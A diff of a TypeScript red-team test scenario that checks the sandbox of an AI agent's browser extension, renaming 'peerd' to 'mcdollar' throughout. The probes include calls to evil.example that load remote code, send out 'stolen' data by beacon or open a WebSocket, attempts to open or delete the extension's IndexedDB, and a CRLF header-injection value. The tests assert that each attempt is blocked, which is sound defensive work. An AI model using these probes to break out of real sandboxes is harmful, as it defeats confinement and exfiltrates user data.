@@ -1,6 +1,6 @@
 // Scenario 06: malicious iframe / sandboxed code attempts a sandbox escape.
 //
-// Adversary: code the agent was induced to run inside a peerd sandbox, a
+// Adversary: code the agent was induced to run inside a mcdollar sandbox, a
 // Notebook / headless script worker, or an a2a_run, tries to break out: open a
 // raw socket to exfiltrate, load remote code, recover the native fetch, unseal
 // the bridge, mint a fresh un-sealed realm, or traverse OPFS out of its root.
@@ -22,18 +22,18 @@ import {
   type Scenario, type Probe, blocked, leaked, summarize,
 } from '../harness.ts';
 import { applyNotebookRealmSeal } from '../../../extension/engine-tabs/notebook-tab/notebook-neutralizers.js';
-import { resolveRelativePath } from '../../../extension/peerd-engine/module-resolver.js';
-import { opfsHelpers } from '../../../extension/peerd-engine/opfs.js';
-import { composeApp, stripMetaRefresh } from '../../../extension/peerd-engine/app-compose.js';
-import { normalizeRequest, needsWebWriteConfirm } from '../../../extension/peerd-engine/vm-net/http-bridge.js';
+import { resolveRelativePath } from '../../../extension/mcdollar-engine/module-resolver.js';
+import { opfsHelpers } from '../../../extension/mcdollar-engine/opfs.js';
+import { composeApp, stripMetaRefresh } from '../../../extension/mcdollar-engine/app-compose.js';
+import { normalizeRequest, needsWebWriteConfirm } from '../../../extension/mcdollar-engine/vm-net/http-bridge.js';
 import {
   buildAppEgressBlockRule,
   APP_EGRESS_REGEX,
   CHROME_DNR_RESOURCE_TYPES,
-} from '../../../extension/peerd-egress/denylist/dnr-rules.js';
+} from '../../../extension/mcdollar-egress/denylist/dnr-rules.js';
 import { makeOffscreenActorChannelClient } from '../../../extension/background/offscreen-actor-channel-client.js';
 import { buildWorkerSource } from '../../../extension/engine-tabs/notebook-tab/worker-source.js';
-import { formatEvalResult } from '../../../extension/peerd-runtime/tools/defs/js-notebook.js';
+import { formatEvalResult } from '../../../extension/mcdollar-runtime/tools/defs/js-notebook.js';
 
 // A mock worker global shaped like a real DedicatedWorkerGlobalScope: raw
 // constructors as own props, fetch/importScripts/caches on the prototype.
@@ -46,7 +46,7 @@ const freshGlobal = () => {
     caches: { open: () => 'x', match: () => undefined, has: () => false, delete: () => false, keys: () => [] },
     // indexedDB is a same-origin DURABLE edge on WorkerGlobalScope.prototype — not
     // network, but the sealed worker runs at the extension origin, so an unsealed
-    // IDBFactory reaches the `peerd` DB (vault blob, always-loaded memory, grants,
+    // IDBFactory reaches the `mcdollar` DB (vault blob, always-loaded memory, grants,
     // audit, and other instances' rows). The seal must block it like caches.
     indexedDB: { open: () => 'NATIVE-IDB', deleteDatabase: () => 0, databases: () => [], cmp: () => 0 },
   };
@@ -70,7 +70,7 @@ const freshGlobal = () => {
 const throwsEgress = (fn: () => unknown): { ok: boolean; detail: string } => {
   try { fn(); return { ok: false, detail: 'did NOT throw, escape succeeded' }; }
   catch (e: any) {
-    const ok = /EgressBlockedError$/.test(String(e?.name)) || /peerd\.egress\.fetch/.test(String(e?.message));
+    const ok = /EgressBlockedError$/.test(String(e?.name)) || /mcdollar\.egress\.fetch/.test(String(e?.message));
     return { ok, detail: ok ? `${e?.name}: ${String(e?.message).slice(0, 48)}` : `threw wrong error: ${String(e)}` };
   }
 };
@@ -80,7 +80,7 @@ export const scenario: Scenario = {
   title: 'Sandbox escape (Notebook/Pod workers, App iframe, WebVM)',
   adversary: 'malicious sandboxed code',
   asset: 'the host origin, the network, and other sandbox instances',
-  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
+  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store; the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `mcdollar` database; OPFS mutation is checked before any root handle is opened; a remote module restricts its whole run to compute only and all remote-controlled output is fenced; an App cannot break out of its iframe or observe a targeted actor job; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
   threatModelRef: 'INV-6',
   tier: 'unit',
   async run() {
@@ -96,8 +96,8 @@ export const scenario: Scenario = {
       { label: 'importScripts remote code', fn: () => g.importScripts('https://evil.example/x.js') },
       { label: 'sendBeacon exfiltration', fn: () => g.navigator.sendBeacon('https://evil.example/', 'stolen') },
       { label: 'reach the network via the Cache API', fn: () => g.caches.open('x') },
-      { label: 'open the extension-origin IndexedDB (vault blob, memory, grants, audit, sibling instances)', fn: () => g.indexedDB.open('peerd') },
-      { label: 'delete an extension-origin IndexedDB database', fn: () => g.indexedDB.deleteDatabase('peerd') },
+      { label: 'open the extension-origin IndexedDB (vault blob, memory, grants, audit, sibling instances)', fn: () => g.indexedDB.open('mcdollar') },
+      { label: 'delete an extension-origin IndexedDB database', fn: () => g.indexedDB.deleteDatabase('mcdollar') },
       { label: 'open the extension-origin OPFS root outside the rooted Notebook workspace', fn: () => g.navigator.storage.getDirectory() },
       { label: 'construct a WebSocketStream (missing-API stub)', fn: () => new g.WebSocketStream('wss://evil.example/') },
     ];
@@ -114,7 +114,7 @@ export const scenario: Scenario = {
     // posture must stop every mutator before OPFS is touched.
     {
       let rootReads = 0;
-      const opfs = opfsHelpers(['peerd-workspace', 'red-team'], {
+      const opfs = opfsHelpers(['mcdollar-workspace', 'red-team'], {
         getDirectory: async () => { rootReads += 1; return {} as any; },
         beforeMutation: () => { throw new Error('workspace read-only'); },
       });
@@ -302,7 +302,7 @@ export const scenario: Scenario = {
         try { normalizeRequest({ url, method: 'GET' } as any); return false; } catch { return true; }
       });
       probes.push(schemeBlocked
-        ? blocked('WebVM requests file:// / chrome:// to read local resources', 'normalizeRequest throws RangeError on non-http(s)/peerd:// schemes')
+        ? blocked('WebVM requests file:// / chrome:// to read local resources', 'normalizeRequest throws RangeError on non-http(s)/mcdollar:// schemes')
         : leaked('WebVM requests file:// / chrome:// to read local resources', 'a dangerous scheme was accepted'));
 
       const crlf = normalizeRequest({ url: 'https://x.example/', method: 'GET', headers: { X: 'a\r\nInjected: 1' } } as any);
@@ -340,10 +340,10 @@ export const scenario: Scenario = {
       'extension/tests/unit/engine-tabs/notebook-tab/notebook-seal.test.js (real worker realm)',
       'extension/tests/unit/offscreen/job-runner.test.js (a2a run denied egress + delegation)',
       'extension/tests/unit/offscreen/job-runner-workspace.test.js (worker and actor-lane OPFS posture bypass refusal)',
-      'tests/peerd-engine/module-import-policy.test.ts (remote-to-local module refusal)',
+      'tests/mcdollar-engine/module-import-policy.test.ts (remote-to-local module refusal)',
       'tests/engine-tabs/notebook-tab/worker-caps-profile.test.ts (remote whole-run profile)',
-      'tests/peerd-runtime/tools/remote-import-policy.test.ts (remote output fence)',
-      'tests/peerd-engine/single-module-linker.test.ts (seal-first graph with no child loads)',
+      'tests/mcdollar-runtime/tools/remote-import-policy.test.ts (remote output fence)',
+      'tests/mcdollar-engine/single-module-linker.test.ts (seal-first graph with no child loads)',
       'extension/tests/unit/red-team/sandbox-escape.test.js (in-browser red-team framing)',
       'scripts/cdp/states.mjs actor-builds-app (live App raw-network capture)',
       'scripts/firefox/run-runtime-tests.mjs (opaque worker host, string-compilation refusal, cancellable compiler and fetch, local and remote graph parity)',
